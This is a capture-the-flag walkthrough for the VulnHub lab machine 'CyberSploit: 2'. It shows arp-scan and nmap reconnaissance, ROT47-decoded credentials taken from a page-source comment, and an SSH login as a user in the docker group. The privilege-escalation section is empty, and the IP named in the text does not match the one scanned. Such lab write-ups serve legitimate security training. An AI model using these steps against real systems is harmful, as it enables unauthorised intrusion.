# CYBERSPLOIT: 2

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:11       (Unknown: locally administered)
192.168.56.100  08:00:27:59:d4:92       PCS Systemtechnik GmbH
192.168.56.130  08:00:27:02:9a:95       PCS Systemtechnik GmbH
```

The ip address is `192.168.56.100`, let's enumerate it

### 2.Enumeration

```bash
root@kali: nmap -sT -sV -sC -v -p- -oN nmap.out 192.168.56.130
Nmap scan report for 192.168.56.130
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: CyberSploit2
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
MAC Address: 08:00:27:02:9A:95 (Oracle VirtualBox virtual NIC)
```

Check website and you will see this page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/45a02596-1a46-470f-ab06-86a7a3c7a84d)

also check page source and at the bottom you will see a comment :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5776a9b1-a9f3-4722-9dc5-3b4a84f2c97d)

try to decode the strings by `ROT47` and you will get :

```text
shailendra : cybersploit1
```

### 3.Gaining Shell

Now we have credentials to ssh to system

```bash
root@kali: ssh shailendra@192.168.56.130                      
The authenticity of host '192.168.56.130 (192.168.56.130)' can't be established.
ED25519 key fingerprint is SHA256:Ua5bYFU7jRE2PNF3w1hs2yrzHmyU7Q3FWj0xvMKZDro.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.130' (ED25519) to the list of known hosts.
shailendra@192.168.56.130's password: 
Last login: Wed Jul 15 12:32:09 2020

[shailendra@localhost ~]$ id
uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### 4.Privilege Escalation






